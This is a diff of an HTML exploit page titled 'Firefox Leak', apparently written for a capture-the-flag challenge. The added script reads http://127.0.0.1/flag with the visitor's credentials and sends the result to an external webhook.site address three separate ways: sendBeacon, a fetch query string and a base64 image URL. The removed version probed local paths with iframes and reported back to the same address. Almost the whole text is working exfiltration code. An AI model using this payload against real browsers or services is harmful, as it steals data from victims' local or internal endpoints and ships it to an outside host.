@@ -1,28 +1,36 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
 <body>
-<h1>FireLeak iframe compare</h1>
-
+<h1>Firefox Leak</h1>
 <script>
-const endpoint = "https://webhook.site/5dc1560a-274c-4539-af81-568512041310";
+// In Firefox, localhost might be treated specially
+async function leak() {
+  try {
+    const response = await fetch('http://127.0.0.1/flag', {
+      method: 'GET',
+      credentials: 'include'
+    });
 
-function log(path, ev) {
-  fetch(`${endpoint}?kind=iframe-compare&path=${encodeURIComponent(path)}&event=${encodeURIComponent(ev)}`)
-    .catch(() => {});
+    const flag = await response.text();
+
+    // Multiple exfiltration methods
+    // Method 1: Beacon (works in background)
+    navigator.sendBeacon('https://webhook.site/5dc1560a-274c-4539-af81-568512041310', flag);
+
+    // Method 2: Regular fetch
+    await fetch('https://webhook.site/5dc1560a-274c-4539-af81-568512041310?flag=' + encodeURIComponent(flag));
+
+    // Method 3: Image
+    new Image().src = 'https://webhook.site/5dc1560a-274c-4539-af81-568512041310?f=' + btoa(flag);
+
+  } catch(err) {
+    navigator.sendBeacon('https://webhook.site/5dc1560a-274c-4539-af81-568512041310', 'Error: ' + err.message);
+  }
 }
 
-function probePath(path) {
-  const ifr = document.createElement("iframe");
-  ifr.onload = () => log(path, "load");
-  ifr.onerror = () => log(path, "error");
-  ifr.src = "http://127.0.0.1" + path + "?cb=" + Math.random();
-  document.body.appendChild(ifr);
-}
-
-probePath("/");
-probePath("/flag");
-probePath("/doesnotexist");
+leak();
 </script>
-
 </body>
 </html>
+
+<!--const endpoint = "https://webhook.site/5dc1560a-274c-4539-af81-568512041310";-->
